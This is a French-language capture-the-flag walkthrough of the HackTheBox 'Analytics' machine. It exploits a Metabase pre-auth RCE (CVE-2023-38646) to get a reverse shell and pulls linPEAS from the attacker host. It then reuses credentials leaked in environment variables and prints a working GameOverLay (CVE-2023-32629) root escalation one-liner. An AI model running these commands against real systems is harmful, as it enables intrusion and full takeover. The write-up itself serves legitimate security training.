---
title: HTB | Analytics
description: Analytics is an easy difficulty Linux machine with exposed HTTP and SSH services. Enumeration of the website reveals a Metabase instance, which is vulnerable to Pre-Authentication Remote Code Execution (CVE-2023-38646), which is leveraged to gain a foothold inside a Docker container. Enumerating the Docker container we see that the environment variables set contain credentials that can be used to SSH into the host. Post-exploitation enumeration reveals that the kernel version that is running on the host is vulnerable to GameOverlay, which is leveraged to obtain root privileges.
slug: analytics-htb
date: 2025-08-31 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Analytics cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Analytics</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.233</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -p- 10.10.11.233

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

### /etc/hosts
On ajoute les noms de domaines necessaire. Un peu plus tard on découvrira qu'il y a également le nom de domaine: **data.analytical.htb**
```bash
## ...
10.10.11.233 analytical.htb
10.10.11.233 data.analytical.htb
```

### Metabase CVE
La machine semble utiliser metabase. En recherchant sur internet: metabase CVE.

On trouve tout de suite une vulnérabilité de 2023 exploitable assez facilemement pour la version de metabase installée.  
J'ai cloné un repo github avec la Proof of concert (PoC) ainsi qu'un autre script pour exploiter la vulnérabilité et ouvrir un shell.
```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Machines/Analytics/CVE-2023-38646]
└─$ python3 CVE-2023-38646-POC.py --ip data.analytical.htb 
Failed to connect using HTTPS for data.analytical.htb. Trying next protocol...
None. Vulnerable Metabase Instance:-
             IP: data.analytical.htb
             Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```
D'après la CVE, si un setup Token est présent sur la page **/api/session/properties**, alors la machine est vulnérable.

### Metabase Exploit - Reverse Shell
Grâce aux deuxième script, on a réussi à ouvrir shell :
```bash
┌──(kali㉿kali)-[~/…/HackTheBox/Machines/Analytics/CVE-2023-38646]
└─$ python3 CVE-2023-38646-Reverse-Shell.py --rhost data.analytical.htb --lhost 10.10.14.125 --lport 44444
[DEBUG] Original rhost: data.analytical.htb
[DEBUG] Preprocessed rhost: http://data.analytical.htb
[DEBUG] Input Arguments - rhost: http://data.analytical.htb, lhost: 10.10.14.125, lport: 44444
[DEBUG] Fetching setup token from http://data.analytical.htb/api/session/properties...
[DEBUG] Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
[DEBUG] Version: v0.46.6
...
```
Sur la kali, on a un deuxième terminal avec un nc ouvert :
```bash
┌──(kali㉿kali)-[~/github/dirsearch]
└─$ nc -lvp 44444
listening on [any] 44444 ...
connect to [10.10.14.125] from analytical.htb [10.10.11.233] 53506
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
d7bb30f10313:/$ whoami
whoami
metabase
```

### Enumeration (linPEAS)
Pour faire un recherche plus poussé sur la machine avec le compte accessible, on va utilisé l'outil **linPEAS**:
```bash
# KALI: On télécharge linPEAS.sh depuis la page "releases" du dépôt github
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh

# KALI: On ouvre le port 80 à l'aide de python sur la machine hôte
sudo python3 -m http.server 80

# CIBLE: On récupère linPEAS.sh depuis la machine cible en se connectant sur le port 80 avec wget
wget 10.10.14.125:80/linPEAS.sh
```
Après l'execution de **linPEAS**, on a pu trouver un utilisateur et un mot de passe:
```bash
# $ env
...
META_USER=metalytics
META_PASS=An4lytics_ds20223#
...
```

### SSH as metalytics
On peut désormais se connecter en ssh avec le compte utilisateur trouvé:
```bash
┌──(kali㉿kali)-[~/Hacking/HackTheBox/Machines/Analytics]
└─$ ssh metalytics@10.10.11.233     
metalytics@10.10.11.233's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
...
...
Last login: Sat Dec 30 17:28:13 2023 from 10.10.14.99
metalytics@analytics:~$ cat user.txt
8102.....9b97
```

## Privilege Escalation

### GameOverlay Exploit : CVE-2023–32629
On a executé a nouveau un linPEAS sur la machine sans grand succès. Cependant, on a trouvé la version qui tourne sur la machine: **Ubuntu 22.04.3**.

Après quelques recherches sur internet on a trouvé une faille exploitable dans cette version d'ubuntu expliqué ici : https://medium.com/@0xrave/ubuntu-gameover-lay-local-privilege-escalation-cve-2023-32629-and-cve-2023-2640-7830f9ef204a

Il s'agit de la **CVE-2023–32629**. Il y a 3 commandes a écrire sur la machine pour vérifier si elle est vulnérable:
```bash
metalytics@analytics:~$ lsmod | grep overlay
overlay               188416  1
metalytics@analytics:~$ modinfo overlay
filename:       /lib/modules/6.2.0-25-generic/kernel/fs/overlayfs/overlay.ko
alias:          fs-overlay
license:        GPL
description:    Overlay filesystem
author:         Miklos Szeredi <miklos@szeredi.hu>
srcversion:     851BCABACE90D7C44199412
depends:        
retpoline:      Y
intree:         Y
name:           overlay
vermagic:       6.2.0-25-generic SMP preempt mod_unload modversions 
sig_id:         PKCS#7
signer:         Build time autogenerated kernel key
sig_key:        03:91:76:66:F0:D5:23:99:A0:4F:17:5E:BD:A8:42:D6:08:A9:5F:71
sig_hashalgo:   sha512
signature:      1E:49:B1:C3:CA:D2:84:15:17:4E:A5:AE:D6:E5:12:FD:D8:88:E3:C2:
        7B:55:50:11:FB:96:54:0C:E5:E7:39:D8:0A:3A:5A:1B:E2:9B:4D:63:
        70:8D:66:E1:72:15:90:BC:33:F2:7D:FA:B6:77:22:F1:7E:54:67:C8:
        9F:13:B4:87:0D:3B:DE:97:BC:06:1A:83:2C:BF:41:23:B5:73:D1:09:
        E6:A8:FE:BD:A3:8C:7D:4C:C9:B6:30:91:24:64:BB:0E:93:7D:99:44:
        2C:22:50:C8:75:9F:CC:67:54:65:AC:1C:CF:D5:87:A9:EC:71:9E:BF:
        C5:9E:C0:22:0E:2B:4F:9E:C9:69:B9:37:BA:B2:4F:7A:F2:A2:76:9C:
        D8:D6:7F:D0:8D:E8:64:D8:40:29:C1:E3:2C:9B:60:B9:35:A6:DA:E2:
        4D:75:90:42:84:98:AE:2B:D4:3A:13:50:94:AD:72:72:B8:35:50:F4:
        64:3C:23:BA:70:EC:D3:EE:05:03:0B:1E:61:01:42:65:2C:5D:44:75:
        CF:E1:62:47:41:02:7A:27:28:EB:F7:D9:02:AB:15:EB:1C:42:54:62:
        F0:2E:B0:FF:7D:AC:A0:FF:30:8F:24:E2:AD:43:7C:81:B8:F5:FB:25:
        D2:5A:71:53:45:99:BF:26:0E:40:D6:DD:3E:37:09:D8:7C:2E:9F:29:
        33:86:CA:53:45:F2:3A:B8:E5:0B:D4:32:38:49:FB:C0:6B:06:19:83:
        6F:FA:05:9D:6C:97:CB:0F:C4:10:EB:A3:76:53:B6:97:CC:EC:86:96:
        01:8F:AB:EB:31:F2:CA:0B:0E:D0:E3:03:6B:3B:30:0B:83:07:74:04:
        96:B7:E6:A2:B7:1D:7A:40:30:FC:F3:B0:E8:A4:F6:2F:5C:7F:F3:28:
        9F:A6:9E:F1:40:ED:F1:21:0E:2E:0A:F0:AC:1D:96:28:8D:C0:A2:56:
        F6:F1:60:F9:2A:36:8C:0C:18:BE:C3:B5:C4:60:3A:53:66:F0:3B:BC:
        92:D1:09:39:20:AB:FE:4B:68:24:A8:0A:0C:77:86:69:10:19:F9:70:
        4F:A3:8A:49:BA:B8:71:27:AA:E9:02:28:09:54:82:34:69:0D:C8:EA:
        0E:44:4A:54:32:D2:FC:E5:08:A1:31:1D:FE:BC:AD:06:75:0F:EF:DC:
        47:6B:F6:BF:E0:E6:50:4E:51:F8:E6:B0:29:5B:7B:D7:D4:C6:1B:E6:
        C5:EA:30:01:C6:F9:C4:B1:28:89:C5:63:7C:5F:9D:CB:43:BB:87:7C:
        A7:DF:C7:4C:C3:8D:17:BD:61:EE:CA:D8:3B:32:81:2B:FA:D0:F6:70:
        47:6C:ED:FA:FF:97:EF:4D:B3:C8:D3:E4
parm:           check_copy_up:Obsolete; does nothing
parm:           redirect_max:Maximum length of absolute redirect xattr value (ushort)
parm:           redirect_dir:Default to on or off for the redirect_dir feature (bool)
parm:           redirect_always_follow:Follow redirects even if redirect_dir feature is turned off (bool)
parm:           index:Default to on or off for the inodes index feature (bool)
parm:           nfs_export:Default to on or off for the NFS export feature (bool)
parm:           xino_auto:Auto enable xino feature (bool)
parm:           metacopy:Default to on or off for the metadata only copy up feature (bool)
metalytics@analytics:~$ mount | grep overlay
overlay on /var/lib/docker/overlay2/a7f6f5739f75f1e4bb96947354c287e8832cbd56e9413c7eb57975b922c7ae7c/merged type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/BC2SP2TYPJ5O4YFC453ADZ5EKX:/var/lib/docker/overlay2/l/XW5JTCT2MPEXHQG7MOTAI2T4KP:/var/lib/docker/overlay2/l/NFDWLGW3V3JHKDMCSIVCIGFRMU:/var/lib/docker/overlay2/l/MW4MXSGOUKAHBMLEMZ4WR4K7P2:/var/lib/docker/overlay2/l/AT6LTLZWU4G7MV5NOTUEB7AR4N:/var/lib/docker/overlay2/l/E6VXP5EJLZW24GE2AHMELF7FTD:/var/lib/docker/overlay2/l/3BARVZES6SW2GPRYNNYXZNM63J:/var/lib/docker/overlay2/l/JMBR2L6LC7K3O6CZHA24AF2CYR:/var/lib/docker/overlay2/l/PMQWGTOJEKRSOK2OV65KQJBDQY:/var/lib/docker/overlay2/l/L7Y5QRKKSPELNF2AUJ55RR2MV5:/var/lib/docker/overlay2/l/RO73TCQC6F7YHICLAOSVCCNSQ6,upperdir=/var/lib/docker/overlay2/a7f6f5739f75f1e4bb96947354c287e8832cbd56e9413c7eb57975b922c7ae7c/diff,workdir=/var/lib/docker/overlay2/a7f6f5739f75f1e4bb96947354c287e8832cbd56e9413c7eb57975b922c7ae7c/work)
```
On a pu en conclure que la machine était bien vulnérable et on a executé le payload expliqué dans l'article.
```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
root@analytics:~# cd /root
root@analytics:/root# cat root.txt 
f241.....692e
```